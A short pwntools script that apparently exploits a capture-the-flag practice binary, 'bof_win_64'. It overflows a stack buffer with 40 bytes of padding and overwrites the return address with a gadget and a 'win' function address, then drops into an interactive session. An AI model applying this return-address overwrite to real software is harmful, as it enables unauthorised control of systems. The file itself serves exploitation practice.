from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/zeratool-challenges/overflow/bof_win_64")
pwn.gdb.attach(p)
p.recvuntil(b'pwn_me:\nYour buffer is at 0x7fffffffffefef0\n')
payload = b"\x00" * 40
payload += p64(0x40101a) + p64(0x401186)
payload += b"\n"
p.send(payload)
p.interactive()
